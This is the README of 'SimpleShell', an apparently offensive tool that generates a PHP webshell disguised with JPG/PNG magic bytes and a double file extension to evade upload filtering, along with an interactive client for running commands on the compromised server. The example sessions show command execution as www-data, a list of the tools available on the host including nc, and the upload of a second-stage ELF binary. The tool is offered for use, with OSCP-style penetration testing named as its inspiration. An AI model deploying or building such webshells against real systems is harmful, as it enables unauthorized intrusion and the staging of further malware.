# SimpleShell
This was invented to be a simple webshell, and interactive client. This was inspired by OSCP to get by loose file filtering with image magic bytes and a double file extension. The interactive client uses requests. So that will need to be installed. I've also included some pcap to show what the webshell interaction would look like :)
##### Improvements
* Added file upload feature
* Reworked webshell
* Added user-agent
* Wrapper detection

##### Needed work
* Reverse shell handler
* Encryption

## Generator
This simply writes the shell to a file. You can specify JPG/PNG as a wrapper for it.
##### Usage
```bash
/shellgen.py --help
usage: shellgen.py [-h] [-t T] [-l L] [-o O] [-p P]

optional arguments:
  -h, --help  show this help message and exit
  -t T        Type of file
  -l L        List types of files/payloads
  -o O        Output filename to save as
  -p P        Payload type
```
##### Example
```bash
./shellgen.py -p php -t jpg -o shell.jpg.php
file shell.jpg.php
shell.jpg.php: JPEG image data, JFIF standard 60.63, density 26736x8293, segment length 0, thumbnail 118x97
```
## Client
This is an interactive client to work with the webshell to be "terminal like." You can also upload files, which is nice. Eventually I'll add file downloads, reverse shell handlers, and even encryption.
##### Usage
```bash
./client.py --help
usage: client.py [-h] -u URL [--wrapper WRAPPER]

optional arguments:
  -h, --help         show this help message and exit
  -u URL, --url URL  URL to webshell
  --wrapper WRAPPER  Filetype wrapper JPG/PNG
```
##### Example
```bash
./client.py --url "http://localhost/shell.jpg.php" --wrapper jpg
 $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

 $ tools
  python
  bash
  perl
  nc
  php
  ruby
 $ upload secondstage.elf /var/crash/leet.elf  
upload successful
```

